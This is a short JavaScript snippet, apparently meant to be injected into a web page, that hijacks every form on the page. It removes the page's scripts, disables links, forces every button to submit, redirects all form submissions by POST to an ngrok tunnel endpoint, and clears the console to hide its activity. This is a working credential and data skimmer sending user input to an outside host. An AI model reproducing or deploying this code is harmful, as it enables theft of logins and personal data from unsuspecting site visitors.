// CONTROL //

const redirect_data = "https://b9a9-177-72-24-32.ngrok-free.app/recv";

// SCRIPT //

const all_script = document.querySelectorAll("script");
const all_a = document.querySelectorAll("* a");
const all_button = document.querySelectorAll("button");
const all_form = document.querySelectorAll("form");

all_script.forEach((script) => script.remove());
all_a.forEach((a) => (a.href = false));

all_button.forEach((button) => {
  if (button.type != "submit") {
    button.type = "submit";
  }
});

all_form.forEach((form) => {
  form.action = redirect_data;
  form.method = "POST";
});

console.clear(true);
